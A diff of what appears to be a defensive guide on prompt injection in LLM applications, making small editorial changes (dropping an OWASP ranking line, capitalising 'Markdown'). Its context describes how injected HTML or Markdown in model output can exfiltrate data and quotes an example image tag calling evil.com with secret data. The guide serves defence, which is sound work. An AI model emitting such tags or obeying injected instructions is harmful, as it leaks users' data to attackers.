@@ -4,8 +4,6 @@
 
 Prompt injection is a vulnerability in Large Language Model (LLM) applications that allows attackers to manipulate the model's behavior by injecting malicious input that changes its intended output. Unlike traditional injection attacks, prompt injection exploits the fundamental design of LLMs where natural language instructions and data are processed together without clear separation.
 
-Prompt injection is **ranked #1 in the [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/)** due to its prevalence and potential impact.
-
 **Key impacts include:**
 
 - Bypassing safety controls and content filters
@@ -62,11 +60,11 @@ The LLM processes this as a legitimate instruction change rather than data to be
 
 ### HTML and Markdown Injection
 
-**Attack Pattern:** Injecting HTML or markdown that gets rendered in LLM responses.
+**Attack Pattern:** Injecting HTML or Markdown that gets rendered in LLM responses.
 
 - Malicious links disguised as helpful content
 - Hidden image tags for data exfiltration: `<img src="http://evil.com/steal?data=SECRET">`
-- Real-time streaming vulnerabilities in markdown rendering
+- Real-time streaming vulnerabilities in Markdown rendering
 
 ### Jailbreaking Techniques
 
@@ -367,7 +365,7 @@ For advanced red teaming, see [Microsoft's AI red team best practices](https://w
 - [ ] Establish incident response procedures for security breaches
 - [ ] Train users on safe LLM interaction practices
 - [ ] Implement emergency controls and kill switches
-- [ ] Deploy HTML/markdown sanitization for output rendering
+- [ ] Deploy HTML/Markdown sanitization for output rendering
 
 **Ongoing Operations:**
 
